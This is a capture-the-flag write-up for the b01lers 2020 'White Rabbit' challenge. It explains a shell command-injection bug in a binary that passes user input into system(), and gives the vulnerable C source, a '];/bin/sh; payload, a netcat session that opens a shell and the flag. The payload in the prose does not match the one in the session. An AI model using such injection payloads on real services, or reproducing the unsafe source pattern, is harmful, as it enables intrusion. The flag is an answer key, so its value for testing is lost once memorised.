# b01lers CTF 2020: Pwn - White Rabbit (100 Points)

![img](https://github.com/FreezeLuiz/CTF-Writeups/blob/master/pwn/images/b01lersctf2020-white_rabbit/white-rabbit-desc.PNG "Challenge Description")

This challenge was fun, it relied on escaping of particular bash command sequence to get a shell on the remote server by executing `/bin/sh` 

We are only presented with the executable binary for local testing...


## Recon and Analysis

Running `checksec` from pwntools on the binary will bring us to a surprisingly secure binary...

```sh
kali@kali:~/Documents/b01lerctf/white_rabbit$ checksec ./whiterabbit
[*] '/home/kali/Documents/b01lerctf/white_rabbit/whiterabbit'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Only lets try some low hanging fruit and go for some `strings`...

```
...
[]A\A]A^A_
Follow the white rabbit.
Path to follow: 
flag
No printing the flag.
[ -f '%1$s' ] && cat '%1$s' || echo File does not exist
:*3$"
GCC: (Ubuntu 9.3.0-10ubuntu2) 9.3.0
.shstrtab
.interp
...
```

The interesting strings are `Follow the white rabbit` until the `[ -f '%1$s' ] && cat '%1$s' || echo File does not exist` which is a bash one liner script when you look at it.


Okay how about if we run the binary, lets interact with it...

```
kali@kali:~/Documents/b01lerctf/white_rabbit$ ./whiterabbit 
Follow the white rabbit.
Path to follow: asd
File does not exist
```

It is looking for a file, and I guess that it is checking if the file exists so it can display its content using `cat filename` what if we try to create a fake flag file locally and try to read the contents of it from the binary...

```
kali@kali:~/Documents/b01lerctf/white_rabbit$ echo "flag{fake_flag_to_the_rescue}" > flag
kali@kali:~/Documents/b01lerctf/white_rabbit$ ./whiterabbit 
Follow the white rabbit.
Path to follow: flag
No printing the flag.
```

There must be a check in the binary that checks if theres a flag in the input and if the string `flag` exists it will print `No printing the flag.`...

From what we know until now there is a bash one-liner script that has `&&` and `||` operators... To understand the bash one-liner better

```
[ -f '%1$s' ] --> Consider this an IF-Statement, our input is '%1$s' and this IF-Statement checks if the file exists.

&& cat '%1$s' --> If the file exists then cat its content.

|| echo File does not exist --> Else if it doens't exist then echo File does not exist.
```

## Exploit and reading the flag

We know that our input is between square brackets `[ 'INPUT' ]` we can escape that square brackets by closing the single quote and followed by closing the square bracket ` ']`

After escaping the square brackets we can specify a semi-colon `;` to end the original command and start a new one, which is `/bin/sh`, and ending with another semi-colon to specify the end of our `/bin/sh` command so it doesn't collide with the rest of the bash one-liner. 

```sh
'];/bin/sh;
```
Trying that payload in the remote server will give us a `/bin/sh` shell, so we can read the flag easily.

```sh
kali@kali:~/Documents/b01lerctf/white_rabbit$ nc chal.ctf.b01lers.com 1013
Follow the white rabbit.
Path to follow: ]';/bin/sh;
$ id
uid=1000(whiterabbit) gid=1000(whiterabbit) groups=1000(whiterabbit)
$ ls
Makefile
flag.txt
whiterabbit
whiterabbit.c
wrapper.sh
$ cat flag.txt
flag{Th3_BuNNy_wabbit_l3d_y0u_h3r3_4_a_reason}
```

## Alternative way: reading the source code.

There is an alternative way, when you find out that the program can read files in the directory, you could try to read the source file which is usually the same name as the binary, so for example the binary's name is `whiterabbit` so the source code might be `whiterabbit.c`

```c
kali@kali:~/Documents/b01lerctf/white_rabbit$ ./whiterabbit 
Follow the white rabbit.
Path to follow: whiterabbit.c
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>


int main() {
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);

    printf("Follow the white rabbit.\n");
    printf("Path to follow: ");

    char buffer[64];

    scanf("%s", buffer);
    if(strstr(buffer, "flag") != NULL) {
        printf("No printing the flag.\n");
        exit(0);
    }
    
    char line[256];
    sprintf(line, "[ -f '%1$s' ] && cat '%1$s' || echo File does not exist", buffer);
    system(line);
}

```